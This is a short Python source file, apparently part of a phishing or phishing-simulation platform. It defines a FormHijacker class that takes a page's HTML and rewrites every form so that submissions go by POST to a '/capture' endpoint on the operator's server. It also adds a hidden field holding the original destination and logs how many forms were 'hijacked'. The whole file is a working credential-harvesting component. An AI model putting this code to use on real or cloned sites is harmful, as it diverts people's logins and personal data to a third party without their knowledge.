from bs4 import BeautifulSoup
from backend.utils.logger import logger

class FormHijacker:
    def __init__(self, project_id: str, api_url: str):
        self.project_id = project_id
        self.capture_endpoint = f"{api_url}/projects/{project_id}/capture"

    def process_html(self, html_content: str) -> str:
        """
        Parses HTML, finds <form> tags, and rewrites action/method.
        Returns modified HTML.
        """
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                return html_content

            count = 0
            for form in forms:
                # Store original action for potential fallback/logging logic later
                original_action = form.get('action', '')
                
                # Rewrite
                form['action'] = self.capture_endpoint
                form['method'] = 'POST'
                
                # Add hidden field for debugging/tracking origin
                hidden_tag = soup.new_tag("input")
                hidden_tag["type"] = "hidden"
                hidden_tag["name"] = "_original_action"
                hidden_tag["value"] = original_action
                form.append(hidden_tag)
                
                count += 1
                
            logger.info(f"Hijacked {count} forms for Project {self.project_id}")
            return str(soup)
            
        except Exception as e:
            logger.error(f"Form Hijack Failed: {e}")
            return html_content
